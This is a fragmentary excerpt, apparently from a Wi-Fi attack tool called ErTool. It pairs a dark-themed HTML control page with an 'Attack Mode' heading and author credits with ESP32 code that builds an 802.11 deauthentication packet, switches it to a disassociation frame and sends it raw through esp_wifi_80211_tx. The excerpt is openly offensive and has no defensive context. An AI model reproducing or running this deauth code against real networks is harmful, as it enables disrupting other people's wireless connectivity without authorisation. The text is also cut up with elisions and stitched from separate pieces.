...
<html>
    <head>
        ...
        <title>WiFi Hacker ERTOOL</title>
        <style>
            body {
                background: #1a1a1a;
                color: #bfbfbf;
    ...
    <body>
        <div class='content'>
        <p>
            <h1 style="border: solid #20c20e 3px; padding: 0.2em 0.2em; text-align: center; font-size: 2.5rem;">ErTool</h1>
            <span style="color: #F04747;">info: </span><br>
            <span>
                - This tool was made by Erennkrb
                - Special Credits: VPN-HACKER
            </span>
        </p><br><hr><br>
        <h1>Attack Mode</h1>
...
Serial.println("Deauth packet sent");  
    ...
    Serial.println(bytesToStr(deauthPacket, 26));
    deauthPacket[0] = 0xA0;
   esp_err_t result = esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);  // Send raw packet
Serial.println(result == ESP_OK ? "Deauth packet sent" : "Failed to send deauth packet");  // Confirm packet sent
